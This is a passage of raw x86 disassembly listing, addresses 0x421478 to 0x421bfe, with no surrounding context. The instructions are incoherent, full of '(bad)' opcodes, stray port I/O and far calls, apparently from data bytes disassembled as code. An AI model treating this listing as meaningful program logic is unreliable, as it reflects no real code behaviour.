  421478:	pop    esp
  421479:	jnp    0x4214f2
  42147b:	dec    ebp
  42147c:	fisttp WORD PTR [edi-0x24]
  42147f:	ficom  DWORD PTR [edi+0x68]
  421482:	sar    DWORD PTR ds:0x9eb437a6,cl
  421488:	pop    edi
  421489:	stc    
  42148a:	shl    DWORD PTR [eax-0x315df407],cl
  421490:	sti    
  421491:	pop    edi
  421492:	shl    BYTE PTR [ebp+0x66be722f],1
  421498:	pop    eax
  421499:	inc    edx
  42149a:	leave  
  42149b:	cmp    BYTE PTR [ebx],dh
  42149d:	test   BYTE PTR [eax-0x21],al
  4214a0:	inc    eax
  4214a1:	into   
  4214a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214a3:	cmp    eax,0x629dbbb0
  4214a8:	enter  0x6170,0xef
  4214ac:	jns    0x421466
  4214ae:	push   ss
  4214af:	mov    esi,DWORD PTR [edx-0x291da6c4]
  4214b5:	xchg   edi,eax
  4214b6:	js     0x42149a
  4214b8:	adc    ebx,DWORD PTR [esp+eiz*4-0x5a]
  4214bc:	pop    es
  4214bd:	inc    esi
  4214be:	add    BYTE PTR [ebp+0x3e602721],cl
  4214c4:	mov    esp,0x797ef794
  4214c9:	sbb    al,0xc8
  4214cb:	push   eax
  4214cc:	dec    ecx
  4214cd:	or     eax,0x97d037ec
  4214d2:	test   eax,0x67e2cebe
  4214d7:	ins    DWORD PTR es:[edi],dx
  4214d8:	fst    DWORD PTR [ebp+0x47]
  4214db:	retf   
  4214dc:	aad    0xe2
  4214de:	loope  0x4214ba
  4214e0:	dec    cx
  4214e2:	jmp    0xfbbe9c02
  4214e7:	lods   eax,DWORD PTR ds:[esi]
  4214e8:	test   eax,0x5a3f1a02
  4214ed:	dec    BYTE PTR [edx]
  4214ef:	pop    esp
  4214f0:	pop    es
  4214f1:	and    al,0x25
  4214f3:	sbb    BYTE PTR [edi-0x136c2375],dl
  4214f9:	inc    edx
  4214fa:	add    al,0x26
  4214fc:	daa    
  4214fd:	fcomp  DWORD PTR [edi]
  4214ff:	jo     0x421532
  421501:	cmp    dl,ch
  421503:	and    ecx,esp
  421505:	mov    dh,0x12
  421507:	enter  0x1415,0x63
  42150b:	cs call 0xcf21:0xd10692b0
  421513:	mov    ebx,edi
  421515:	mov    DWORD PTR [ebp+0x2050083c],esp
  42151b:	enter  0x4ad5,0x51
  42151f:	mov    ch,0x5a
  421521:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421522:	ins    BYTE PTR es:[edi],dx
  421523:	mov    cl,0x22
  421525:	inc    ebp
  421526:	mov    al,0xea
  421528:	inc    ebx
  421529:	in     al,0x39
  42152b:	retf   
  42152c:	jno    0x4214f6
  42152e:	sbb    ebx,DWORD PTR [edx]
  421530:	jnp    0x421556
  421532:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421533:	jne    0x421581
  421535:	out    0x4a,al
  421537:	xchg   ebp,eax
  421538:	inc    esp
  421539:	js     0x421575
  42153b:	repnz or eax,DWORD PTR [esi-0x7e]
  42153f:	mov    bh,0x61
  421541:	scas   eax,DWORD PTR es:[edi]
  421542:	loop   0x421564
  421544:	push   edx
  421545:	adc    al,0xc8
  421547:	and    edi,DWORD PTR [ebx+0x7c]
  42154a:	or     esp,ebx
  42154c:	out    dx,al
  42154d:	push   0x58a7da83
  421552:	and    edi,DWORD PTR [eax+eax*8-0x40]
  421556:	push   esi
  421557:	shl    DWORD PTR [edx],0xef
  42155a:	xchg   DWORD PTR [edx],eax
  42155c:	jle    0x4215bc
  42155e:	sbb    eax,0x7ca2abb5
  421563:	fwait
  421564:	push   ebp
  421565:	xchg   ebx,esi
  421567:	xchg   edx,eax
  421568:	or     DWORD PTR [ebp+edi*4-0x21],ebx
  42156c:	jbe    0x42159a
  42156e:	popf   
  42156f:	push   0x6a
  421571:	and    eax,0xb9b6f699
  421576:	push   es
  421577:	in     eax,dx
  421578:	into   
  421579:	aam    0x2a
  42157b:	retf   0x880e
  42157e:	test   BYTE PTR [edi-0x77],bl
  421581:	cmp    eax,DWORD PTR [esi+0x280c0aa9]
  421587:	xchg   edx,eax
  421588:	add    eax,0xf709ecd3
  42158d:	hlt    
  42158e:	ret    
  42158f:	pop    ds
  421590:	pop    eax
  421591:	das    
  421592:	add    al,0x23
  421594:	or     BYTE PTR [esi+0x5c4da119],dh
  42159a:	or     BYTE PTR [ebx+0x17],ah
  42159d:	adc    ebp,DWORD PTR ss:[esi+ecx*1]
  4215a1:	adc    ch,BYTE PTR [eax]
  4215a3:	mov    ecx,0x67cbc9d
  4215a8:	rcr    esp,1
  4215aa:	pop    ss
  4215ab:	push   ss
  4215ac:	adc    edi,ebx
  4215ae:	cmp    al,0x65
  4215b0:	addr16 cld 
  4215b2:	jne    0x421577
  4215b4:	dec    esp
  4215b5:	addr16 mov ecx,eax
  4215b8:	pop    ebx
  4215b9:	sbb    DWORD PTR [ebx+ecx*1-0x33],esi
  4215bd:	(bad)  [ebp+ecx*2-0x11]
  4215c1:	pop    eax
  4215c2:	icebp  
  4215c3:	cwde   
  4215c4:	sbb    esp,edx
  4215c6:	pop    es
  4215c7:	cmp    eax,0x69cc045e
  4215cc:	pop    ebx
  4215cd:	jbe    0x42164b
  4215cf:	lds    ebp,FWORD PTR [ebx]
  4215d1:	and    edx,esp
  4215d3:	jl     0x421566
  4215d5:	call   0x9582:0x68a890d2
  4215dc:	xchg   ebp,eax
  4215dd:	test   eax,0xde16b651
  4215e2:	push   esp
  4215e3:	mov    dh,0xcf
  4215e5:	mov    ds:0xc3c1f7b,al
  4215ea:	mov    dl,0xac
  4215ec:	jb     0x4215db
  4215ee:	aaa    
  4215ef:	inc    edx
  4215f0:	sbb    eax,0x2e752f68
  4215f5:	pop    ss
  4215f6:	mov    cl,0x2c
  4215f8:	cdq    
  4215f9:	add    edi,edi
  4215fb:	jmp    0xa4149500
  421600:	adc    ah,cl
  421602:	add    eax,0x2fcd21fe
  421607:	shr    DWORD PTR [ebp+0xb],cl
  42160a:	xchg   ebx,eax
  42160b:	push   esp
  42160c:	pop    es
  42160d:	ret    0x5027
  421610:	xlat   BYTE PTR ds:[ebx]
  421611:	mov    edi,0xa0eec2e8
  421616:	imul   edi,DWORD PTR [edi],0x57
  421619:	das    
  42161a:	jge    0x4215e9
  42161c:	sbb    cl,al
  42161e:	add    DWORD PTR [esi-0x6d88a412],ecx
  421624:	ins    BYTE PTR es:[edi],dx
  421625:	inc    ecx
  421626:	jno    0x42168e
  421628:	adc    bl,BYTE PTR [ebx]
  42162a:	sub    eax,0xc11f46b2
  42162f:	hlt    
  421630:	fld    TBYTE PTR [esp-0x17e5e4fe]
  421637:	ror    edi,cl
  421639:	cmp    DWORD PTR [edx+0x4e2fa71c],esp
  42163f:	pop    ss
  421640:	dec    ecx
  421641:	push   ebx
  421642:	inc    eax
  421643:	mov    ebp,0x913af8dd
  421648:	ins    DWORD PTR es:[edi],dx
  421649:	mov    al,0xde
  42164b:	mov    eax,0xe006cf8c
  421650:	mov    WORD PTR [esi],es
  421652:	repnz xor BYTE PTR [edx+0x4c],bl
  421656:	mov    WORD PTR [eax],ss
  421658:	jg     0x42165a
  42165a:	add    BYTE PTR [eax],al
  42165c:	stc    
  42165d:	std    
  42165e:	in     eax,dx
  42165f:	mov    cl,0xed
  421661:	mov    cl,0xfd
  421663:	std    
  421664:	pop    ds
  421665:	xor    dl,0xed
  421668:	cdq    
  421669:	in     eax,dx
  42166a:	xor    DWORD PTR [ebx-0x29],ebp
  42166d:	xchg   ecx,eax
  42166e:	add    DWORD PTR [eax],eax
  421670:	test   DWORD PTR [edx],eax
  421672:	add    BYTE PTR [eax],al
  421674:	ins    DWORD PTR es:[edi],dx
  421675:	shl    BYTE PTR [esi],cl
  421677:	jge    0x4216d5
  421679:	or     BYTE PTR [eax+0x2b62e1aa],dh
  42167f:	arpl   WORD PTR [eax+0x48],bp
  421682:	dec    eax
  421683:	inc    edx
  421684:	(bad)  
  421686:	mov    eax,DWORD PTR [edi]
  421688:	dec    edx
  421689:	ja     0x421618
  42168b:	jmp    0x8073a421
  421690:	popa   
  421691:	mov    ds,WORD PTR [esi+0x65c109e0]
  421697:	xchg   BYTE PTR [ebp+edx*4+0x64297b4f],dl
  42169e:	js     0x4216bb
  4216a0:	daa    
  4216a1:	loopne 0x421646
  4216a3:	repz ficom WORD PTR [ecx-0x45c238d3]
  4216aa:	xor    BYTE PTR [ebx+0x44bdf2f5],al
  4216b0:	pusha  
  4216b1:	xor    ebx,ebp
  4216b3:	jge    0x4216c3
  4216b5:	and    DWORD PTR ds:0xedb0b925,esp
  4216bb:	(bad)  
  4216bc:	mov    dh,BYTE PTR [ecx-0x33]
  4216bf:	or     eax,0x77a348d6
  4216c4:	retf   
  4216c5:	cmp    edx,DWORD PTR [ebp-0x18]
  4216c8:	fs (bad) 
  4216ca:	repz lea edx,[ecx-0x7b]
  4216ce:	fdivr  st,st(4)
  4216d0:	cdq    
  4216d1:	retf   0x3320
  4216d4:	sti    
  4216d5:	xlat   BYTE PTR ds:[ebx]
  4216d6:	jne    0x42169e
  4216d8:	xchg   edi,eax
  4216d9:	stc    
  4216da:	xor    eax,DWORD PTR [edi-0x5bfc995]
  4216e0:	nop
  4216e1:	dec    ecx
  4216e2:	mov    DWORD PTR [ebx-0x569e83a4],ecx
  4216e8:	jae    0x421675
  4216ea:	dec    eax
  4216eb:	sti    
  4216ec:	fist   DWORD PTR [esi-0x3f]
  4216ef:	(bad)  
  4216f1:	lds    esp,FWORD PTR [ecx-0x55]
  4216f4:	popf   
  4216f5:	mov    ds:0x881887e2,eax
  4216fa:	push   edx
  4216fb:	add    al,0x68
  4216fd:	mov    esp,0x8dec5c75
  421702:	daa    
  421703:	or     bh,BYTE PTR [ebx]
  421705:	fstp   TBYTE PTR [eax-0x71]
  421708:	in     eax,0x9d
  42170a:	outs   dx,DWORD PTR ds:[esi]
  42170b:	add    DWORD PTR [edx+0x68],0x862bd345
  421712:	adc    bh,BYTE PTR [ebp-0x2f]
  421715:	je     0x42176f
  421717:	dec    ebx
  421718:	push   cs
  421719:	pop    es
  42171a:	int    0xb3
  42171c:	xchg   ebp,eax
  42171d:	scas   eax,DWORD PTR es:[edi]
  42171e:	xchg   esi,ebp
  421720:	out    dx,eax
  421721:	sub    cl,ch
  421723:	mov    edi,0x462a6a3c
  421728:	aam    0x83
  42172a:	enter  0xf45c,0x32
  42172e:	enter  0xf498,0xa5
  421732:	add    DWORD PTR [edx],edx
  421734:	mov    eax,ds:0xa01415f9
  421739:	pop    ecx
  42173a:	clc    
  42173b:	push   eax
  42173d:	xchg   esp,eax
  42173e:	repz call 0x8b20:0xc551b6b2
  421746:	mov    ch,0xa6
  421748:	aas    
  421749:	popf   
  42174a:	mov    ah,ch
  42174c:	lds    ecx,FWORD PTR [esi+0x36d4567d]
  421752:	stos   BYTE PTR es:[edi],al
  421753:	cwde   
  421754:	ret    
  421755:	mov    bh,0x0
  421757:	dec    eax
  421758:	lods   al,BYTE PTR ds:[esi]
  421759:	xchg   DWORD PTR [eax-0x4b543ae5],ecx
  42175f:	popf   
  421760:	pop    ebx
  421761:	xor    ch,BYTE PTR [eax]
  421763:	cmc    
  421764:	repz cmp bh,dh
  421767:	call   0x649f:0x23fae650
  42176e:	push   edi
  42176f:	push   0x90792a86
  421774:	push   es
  421775:	inc    edi
  421776:	sbb    al,0xbf
  421778:	sub    al,0xa6
  42177a:	inc    esp
  42177b:	pop    ebx
  42177c:	xchg   bh,bl
  42177e:	or     esi,DWORD PTR [ebx+0x76]
  421781:	fldenv [eax+eiz*8-0x1581c94c]
  421788:	jmp    0x421734
  42178a:	call   0xb9f5:0xc38d6119
  421791:	ins    DWORD PTR es:[edi],dx
  421792:	pop    ss
  421793:	daa    
  421794:	ins    BYTE PTR es:[edi],dx
  421795:	dec    eax
  421796:	or     ebp,eax
  421798:	or     edx,DWORD PTR [edx-0x43]
  42179b:	pop    ebp
  42179c:	(bad)  
  42179e:	mov    bh,0x30
  4217a0:	shl    BYTE PTR [esi-0x29],cl
  4217a3:	iret   
  4217a4:	push   0x6a8a47d5
  4217a9:	sub    ecx,DWORD PTR [ecx-0x64]
  4217ac:	push   es
  4217ad:	add    ah,dh
  4217af:	scas   al,BYTE PTR es:[edi]
  4217b0:	push   edx
  4217b1:	mov    ebx,0x1b41a4de
  4217b6:	dec    ebp
  4217b7:	mov    cl,0xb2
  4217b9:	adc    dh,0xb5
  4217bc:	mov    DWORD PTR [ecx+edi*2-0x3624c37d],ecx
  4217c3:	xchg   esp,eax
  4217c4:	sbb    eax,0x4a5eb967
  4217c9:	(bad)  [edx+eax*2]
  4217cc:	inc    eax
  4217cd:	inc    BYTE PTR [edi+0x1023328a]
  4217d3:	jb     0x421845
  4217d5:	loopne 0x421815
  4217d7:	pop    ecx
  4217d8:	cmp    eax,0x91c1255d
  4217dd:	adc    DWORD PTR [edi],edi
  4217df:	je     0x42184f
  4217e1:	mov    esi,0x7cffdd07
  4217e6:	and    edi,eax
  4217e8:	and    BYTE PTR [ebp-0x22],dl
  4217eb:	lock push es
  4217ed:	pop    edx
  4217ee:	mov    eax,0xae0bb3a9
  4217f3:	add    al,0xf9
  4217f5:	xor    al,0xb0
  4217f7:	cld    
  4217f8:	cld    
  4217f9:	in     eax,dx
  4217fa:	and    al,0x1b
  4217fc:	xchg   ebx,eax
  4217fd:	ret    0xdafa
  421800:	ins    BYTE PTR es:[edi],dx
  421801:	pushf  
  421802:	cmp    BYTE PTR [edi],ah
  421804:	aam    0x4c
  421806:	inc    ebx
  421807:	inc    edi
  421808:	mov    dh,0x62
  42180a:	(bad)  
  42180b:	xor    al,0xda
  42180d:	outs   dx,DWORD PTR ds:[esi]
  42180e:	or     esp,DWORD PTR [edx-0x60a6bf21]
  421814:	jae    0x421892
  421816:	or     ecx,DWORD PTR [edi-0x12]
  421819:	xchg   edi,eax
  42181a:	dec    edi
  42181b:	and    al,0x7a
  42181d:	rcl    DWORD PTR [edx+0x48c2e5e9],cl
  421823:	scas   al,BYTE PTR es:[edi]
  421824:	mov    BYTE PTR [ebp-0x60663b4f],al
  42182a:	push   ds
  42182b:	test   cl,ch
  42182d:	adc    eax,0xcafcb354
  421832:	jns    0x42182e
  421834:	xchg   esi,eax
  421835:	gs mov edi,0x89cf5864
  42183b:	sbb    esp,DWORD PTR [esi+0x17]
  42183e:	fstp   DWORD PTR [esi+0x46f40b7d]
  421844:	lods   eax,DWORD PTR ds:[esi]
  421845:	xchg   DWORD PTR [edi+0x5b254c7a],edx
  42184b:	push   ecx
  42184c:	xor    DWORD PTR [ebp-0x278dce1d],eax
  421852:	enter  0x2721,0xd
  421856:	pop    ecx
  421857:	cs push esp
  421859:	push   ss
  42185a:	cs push es
  42185c:	in     eax,0x49
  42185e:	std    
  42185f:	xchg   ebx,eax
  421860:	xlat   BYTE PTR ds:[ebx]
  421861:	and    al,0x3
  421863:	in     al,dx
  421864:	dec    ecx
  421865:	ins    BYTE PTR es:[edi],dx
  421866:	xchg   esi,eax
  421867:	xchg   ebx,eax
  421868:	retf   0xeb51
  42186b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42186c:	push   esp
  42186d:	and    DWORD PTR [edx+0x5a068d77],esi
  421873:	pop    es
  421874:	mov    dh,0xa3
  421876:	jnp    0x421857
  421878:	inc    esi
  421879:	jns    0x42187e
  42187b:	loopne 0x4218ae
  42187d:	imul   BYTE PTR [ecx+0x39]
  421880:	xor    ecx,DWORD PTR [ecx+0x4b]
  421883:	jns    0x421841
  421885:	outs   dx,DWORD PTR ds:[esi]
  421886:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421887:	xchg   al,cl
  421889:	les    edx,FWORD PTR [edi+0x624860b2]
  42188f:	sbb    edx,DWORD PTR [edx-0x4e]
  421892:	retf   
  421893:	mov    ds:0x1a8ec198,al
  421898:	aaa    
  421899:	dec    edi
  42189a:	arpl   WORD PTR [eax+0x5e],bx
  42189d:	mov    dh,0x1
  42189f:	mov    al,0x94
  4218a1:	mov    ds:0x57b3b02c,al
  4218a6:	xchg   ebp,eax
  4218a7:	adc    eax,0xd5de3179
  4218ac:	(bad)  
  4218ad:	out    0xfd,al
  4218af:	pop    ds
  4218b0:	xchg   DWORD PTR [edx-0x79e51ed3],esi
  4218b6:	push   ebp
  4218b7:	(bad)  
  4218b8:	jg     0x4218ba
  4218ba:	mov    bl,0x4c
  4218bc:	sub    BYTE PTR [ebx],dh
  4218be:	pop    esi
  4218bf:	inc    eax
  4218c0:	outs   dx,DWORD PTR ds:[esi]
  4218c1:	mov    ?,ebx
  4218c3:	add    DWORD PTR [ebp-0x3c],edi
  4218c6:	stos   BYTE PTR es:[edi],al
  4218c7:	add    al,0xc2
  4218c9:	out    0xbb,al
  4218cb:	dec    esp
  4218cc:	dec    esi
  4218cd:	sub    DWORD PTR fs:[eax],edi
  4218d0:	sub    al,0x2
  4218d2:	ins    BYTE PTR es:[edi],dx
  4218d3:	call   0x8561bd46
  4218d8:	arpl   WORD PTR [eax],si
  4218da:	mov    dh,0xeb
  4218dc:	shl    BYTE PTR [esi-0x3d],cl
  4218df:	jp     0x4218f0
  4218e1:	and    al,0xd4
  4218e3:	inc    ebx
  4218e4:	push   ebp
  4218e5:	sbb    al,0x52
  4218e8:	jb     0x421917
  4218ea:	and    BYTE PTR [eax-0x374005a7],bh
  4218f0:	ins    DWORD PTR es:[edi],dx
  4218f1:	mov    ah,0xc2
  4218f3:	jo     0x4218ba
  4218f5:	adc    BYTE PTR [ebp+eiz*4-0x59],bh
  4218f9:	add    BYTE PTR [eax],al
  4218fb:	add    dl,dh
  4218fd:	rol    BYTE PTR ds:0xf6d53751,0xe3
  421904:	out    dx,al
  421905:	sub    ebp,esp
  421907:	pmaxub mm4,QWORD PTR [eax]
  42190a:	pop    edx
  42190b:	xchg   DWORD PTR [esp+edx*4+0x1],ebx
  42190f:	add    BYTE PTR [ebp+0x9000002],al
  421915:	icebp  
  421916:	ds jle 0x4218f3
  421919:	inc    BYTE PTR [esi]
  42191b:	sub    DWORD PTR [esi+0x1e2cb037],0x7f
  421922:	iret   
  421923:	adc    edx,DWORD PTR [edi]
  421925:	stc    
  421926:	inc    eax
  421927:	push   ebx
  421928:	and    eax,0xd4f28aee
  42192d:	push   eax
  42192e:	loopne 0x421921
  421930:	jb     0x421994
  421932:	jno    0x4219af
  421934:	aam    0xd2
  421936:	daa    
  421937:	mov    al,ds:0x3c95108f
  42193c:	push   cs
  42193d:	mov    ah,0x6
  42193f:	push   ebx
  421940:	inc    edx
  421941:	rcl    DWORD PTR [ecx-0x94aa5bc],cl
  421947:	or     ebx,esi
  421949:	std    
  42194a:	push   ebx
  42194b:	and    eax,DWORD PTR [ecx-0x56]
  42194e:	sbb    dl,BYTE PTR [edi+ebx*2]
  421951:	not    BYTE PTR [edi]
  421953:	shl    ch,0x95
  421956:	loopne 0x4218dc
  421958:	das    
  421959:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42195a:	sbb    al,0x7c
  42195c:	test   eax,0x6be8da7f
  421961:	inc    eax
  421962:	fisttp DWORD PTR [esi+0x72]
  421965:	ds mov dl,0xe1
  421968:	jne    0x421979
  42196a:	aad    0x1
  42196c:	xor    al,0x43
  42196e:	mov    al,0x40
  421970:	dec    ebp
  421971:	and    al,0x96
  421973:	fisubr DWORD PTR ds:0xe1472992
  421979:	out    0x34,eax
  42197b:	jbe    0x4219d3
  42197d:	cmp    bl,al
  42197f:	jnp    0x4219a7
  421981:	jl     0x4219f1
  421983:	pop    ds
  421984:	adc    ah,bh
  421986:	or     ebp,DWORD PTR [edi-0x3d89e37d]
  42198c:	adc    DWORD PTR [edx+edi*2],eax
  42198f:	mov    DWORD PTR [eax+edx*1+0x50fe1f71],esp
  421996:	in     eax,0xd7
  421998:	xchg   esi,eax
  421999:	push   0x3f86e07b
  42199e:	mov    esi,es
  4219a0:	in     eax,0xb0
  4219a2:	jge    0x4219e9
  4219a4:	outs   dx,BYTE PTR ds:[esi]
  4219a5:	xchg   edi,eax
  4219a6:	ja     0x4219fe
  4219a8:	mov    BYTE PTR [eax+eax*8-0xe9bb699],dh
  4219af:	mov    dl,0xd7
  4219b1:	cld    
  4219b2:	iret   
  4219b3:	fs aad 0x57
  4219b6:	sbb    ecx,DWORD PTR [edx+0x654dc75c]
  4219bc:	jns    0x421940
  4219be:	popa   
  4219bf:	mov    DWORD PTR [ecx-0x4d422720],ebp
  4219c5:	sub    esi,ebp
  4219c7:	xchg   edx,eax
  4219c8:	xchg   BYTE PTR [edx*2-0x3292547d],dl
  4219cf:	fst    DWORD PTR [ebx+0x1671b310]
  4219d5:	ss cld 
  4219d7:	fsincos 
  4219d9:	lahf   
  4219da:	mov    fs,WORD PTR [edx+0x598f2de7]
  4219e0:	leave  
  4219e1:	scas   al,BYTE PTR es:[edi]
  4219e2:	pop    ds
  4219e3:	inc    ebp
  4219e4:	dec    edx
  4219e5:	test   al,0x9b
  4219e7:	aad    0x3f
  4219e9:	inc    esi
  4219ea:	jbe    0x421987
  4219ec:	dec    esp
  4219ed:	adc    ah,BYTE PTR [esi-0x63]
  4219f0:	test   BYTE PTR [ebp-0x2e],bh
  4219f3:	sub    al,0x1b
  4219f5:	adc    esp,esp
  4219f7:	sar    BYTE PTR [esp+ebp*8+0x1e0a0f61],0x11
  4219ff:	cdq    
  421a00:	ret    0x30d0
  421a03:	push   cs
  421a04:	aaa    
  421a05:	(bad)  
  421a06:	cmp    eax,DWORD PTR [esi]
  421a08:	pop    edx
  421a09:	out    dx,eax
  421a0a:	mov    ss,edx
  421a0c:	or     eax,0x41bab218
  421a11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421a12:	into   
  421a13:	push   esp
  421a14:	ss dec eax
  421a16:	xchg   esp,eax
  421a17:	and    bl,dl
  421a19:	neg    ebp
  421a1b:	xchg   DWORD PTR [edx-0x5589c2aa],ebx
  421a21:	jle    0x421a44
  421a23:	dec    ebx
  421a24:	(bad)  cs:[ebx]
  421a27:	lds    edi,FWORD PTR [ecx-0xc]
  421a2a:	inc    eax
  421a2b:	sbb    bh,al
  421a2d:	adc    ecx,eax
  421a2f:	xchg   DWORD PTR [esi+esi*8+0x7baa36aa],edi
  421a36:	sub    esp,DWORD PTR [ebx]
  421a38:	ror    WORD PTR [edx+ecx*1+0x498b7039],0x68
  421a41:	fidivr WORD PTR [ebx]
  421a43:	aad    0x67
  421a45:	or     eax,0x39494241
  421a4a:	or     DWORD PTR [ecx+0x19],0x7e706580
  421a51:	mov    dh,0xb1
  421a53:	pop    esi
  421a54:	inc    esi
  421a55:	or     esp,esi
  421a57:	cmp    BYTE PTR [ecx-0x11],ah
  421a5a:	xor    BYTE PTR [ebx-0x63],0xa2
  421a5e:	arpl   WORD PTR [esi],cx
  421a60:	pop    edx
  421a61:	fs jl  0x421aa9
  421a64:	(bad)  
  421a65:	int    0xd1
  421a67:	jns    0x421a31
  421a69:	test   eax,0x42ca25b0
  421a6e:	inc    edx
  421a6f:	mov    ds,ebx
  421a71:	sbb    bh,BYTE PTR [eax+0x1f0b0875]
  421a77:	cmp    al,BYTE PTR [ebp+0x57af8cc]
  421a7d:	cmp    edi,ebp
  421a7f:	xor    al,0xf6
  421a81:	ins    BYTE PTR es:[edi],dx
  421a82:	cmp    eax,0xdc6ffba1
  421a87:	hlt    
  421a88:	cmp    bl,dl
  421a8a:	ds xor eax,0x4250166c
  421a90:	fld    TBYTE PTR [edx-0x2b]
  421a93:	test   al,0x1a
  421a95:	push   esp
  421a96:	push   0xc7856ccb
  421a9b:	pop    edx
  421a9c:	push   esi
  421a9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a9e:	xchg   edx,eax
  421a9f:	adc    eax,0xef8e6e42
  421aa4:	repnz and eax,0xf7bcdc80
  421aaa:	sub    ecx,eax
  421aac:	scas   al,BYTE PTR es:[edi]
  421aad:	cli    
  421aae:	push   cs
  421aaf:	out    dx,al
  421ab0:	inc    eax
  421ab1:	sbb    cl,dl
  421ab3:	dec    eax
  421ab4:	lds    edi,FWORD PTR [esi]
  421ab6:	pop    esi
  421ab7:	repz push ebx
  421ab9:	ins    BYTE PTR es:[edi],dx
  421aba:	shl    BYTE PTR [ecx],cl
  421abc:	mov    esp,0xb1e84704
  421ac1:	mov    eax,ds:0x2491b6fd
  421ac6:	sbb    ecx,ecx
  421ac8:	inc    ebx
  421ac9:	adc    DWORD PTR [eax],0x36
  421acc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421acd:	mov    WORD PTR [eax+ebp*4],cs
  421ad0:	mov    eax,0x4bea89aa
  421ad5:	cmp    dl,BYTE PTR [edi+0x1a43ba6a]
  421adb:	icebp  
  421adc:	repnz (bad) 
  421ade:	xor    al,0x4e
  421ae0:	ins    DWORD PTR es:[edi],dx
  421ae1:	lods   eax,DWORD PTR ds:[esi]
  421ae2:	mov    ss,WORD PTR [edx-0x25157242]
  421ae8:	mov    cl,0xc6
  421aea:	pop    esi
  421aeb:	aam    0x23
  421aed:	push   ss
  421aee:	loopne 0x421b3c
  421af0:	push   esi
  421af1:	and    cl,BYTE PTR [ebx+0x999fee6]
  421af7:	xchg   edx,eax
  421af8:	mov    edi,0x1bdf820b
  421afd:	and    eax,0x5d0e32c6
  421b02:	mov    al,ds:0x75d8cccb
  421b07:	out    0x72,al
  421b09:	add    ebx,DWORD PTR [ecx+ecx*8]
  421b0c:	rcl    BYTE PTR [ebp+0xc],0xbf
  421b10:	mov    ch,0x8
  421b12:	in     eax,dx
  421b13:	push   ebp
  421b14:	rcr    BYTE PTR [edi+0x3e28495a],0x84
  421b1b:	test   BYTE PTR [edx-0xe],0x75
  421b1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b20:	pop    ebp
  421b21:	je     0x421abc
  421b23:	int3   
  421b24:	mov    al,0xc0
  421b26:	pop    ecx
  421b27:	jne    0x421b47
  421b29:	push   ds
  421b2a:	push   ebx
  421b2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b2c:	ret    
  421b2d:	xchg   BYTE PTR [ebx-0x7a],bh
  421b30:	pop    ds
  421b31:	pop    ds
  421b32:	sahf   
  421b33:	cdq    
  421b34:	dec    edx
  421b35:	sbb    al,0x2e
  421b37:	inc    edi
  421b38:	xchg   edx,eax
  421b39:	out    dx,eax
  421b3a:	jmp    0x53983e6a
  421b3f:	in     al,0xb3
  421b41:	(bad)  
  421b42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b43:	call   0x100f17f
  421b48:	jo     0x421b6b
  421b4a:	popa   
  421b4b:	stos   BYTE PTR es:[edi],al
  421b4c:	mov    al,ds:0x31a25316
  421b51:	(bad)  
  421b52:	ins    BYTE PTR es:[edi],dx
  421b53:	dec    esp
  421b54:	mov    ds:0xfd0d8a95,eax
  421b59:	test   bx,0x2fc6
  421b5e:	mov    ds:0x51da2cf0,eax
  421b63:	cmp    BYTE PTR [ebp+0x58],dl
  421b66:	pop    DWORD PTR [edx+0x38]
  421b69:	loop   0x421b8d
  421b6b:	fiadd  WORD PTR [ebx+0x19]
  421b6e:	cwde   
  421b6f:	pop    esp
  421b70:	aaa    
  421b71:	xchg   ebp,eax
  421b72:	ja     0x421b2f
  421b74:	push   esi
  421b75:	scas   eax,DWORD PTR es:[edi]
  421b76:	cmp    ch,BYTE PTR [ebx+0x48149413]
  421b7c:	jns    0x421bf9
  421b7e:	stos   BYTE PTR es:[edi],al
  421b7f:	cmp    ah,cl
  421b81:	(bad)  [ebx]
  421b83:	outs   dx,DWORD PTR ds:[esi]
  421b84:	(bad)  
  421b85:	jno    0x421b9f
  421b87:	sbb    BYTE PTR [ebp-0x2a],ch
  421b8a:	jbe    0x421b61
  421b8c:	sub    BYTE PTR [ecx-0x10],al
  421b8f:	repz and cl,BYTE PTR [ebx+0x7720e70e]
  421b96:	mov    esi,0x466f
  421b9b:	add    BYTE PTR [ebx+0x41],al
  421b9e:	popa   
  421b9f:	data16 arpl WORD PTR [esi+0x47],sp
  421ba3:	rcr    DWORD PTR gs:[edi+0x16],cl
  421ba7:	xor    BYTE PTR [edx],bl
  421ba9:	test   dl,ah
  421bab:	stos   DWORD PTR es:[edi],eax
  421bac:	loope  0x421b44
  421bae:	add    DWORD PTR [eax],eax
  421bb0:	test   DWORD PTR [edx],eax
  421bb2:	add    BYTE PTR [eax],al
  421bb4:	xor    DWORD PTR [ebx+0x91ac756],ebp
  421bba:	int    0x23
  421bbc:	xchg   BYTE PTR [esi+ebp*8-0x45c13f4e],ah
  421bc3:	jae    0x421c44
  421bc5:	sub    dh,ah
  421bc7:	imul   edx,edi,0xffffffe9
  421bca:	and    BYTE PTR [edx+0x45],dh
  421bcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421bce:	repz daa 
  421bd0:	jo     0x421c14
  421bd2:	pop    ecx
  421bd3:	push   ebx
  421bd4:	adc    ecx,ebp
  421bd6:	or     BYTE PTR [edi+0x48881141],bh
  421bdc:	pop    ebx
  421bdd:	bound  eax,QWORD PTR [ecx+eax*4]
  421be0:	jae    0x421bd6
  421be2:	imul   esp,eax,0x33
  421be5:	inc    edi
  421be6:	xchg   ebp,eax
  421be7:	fcmovnbe st,st(1)
  421be9:	mov    ds:0xc7866d13,eax
  421bee:	clc    
  421bef:	add    eax,0x3585de7a
  421bf4:	outs   dx,BYTE PTR ds:[esi]
  421bf5:	mov    cl,0x3f
  421bf7:	jg     0x421beb
  421bf9:	cmp    ah,0x99
  421bfc:	outs   dx,DWORD PTR ds:[esi]
  421bfd:	popf   
  421bfe:	sbb    cl,bh
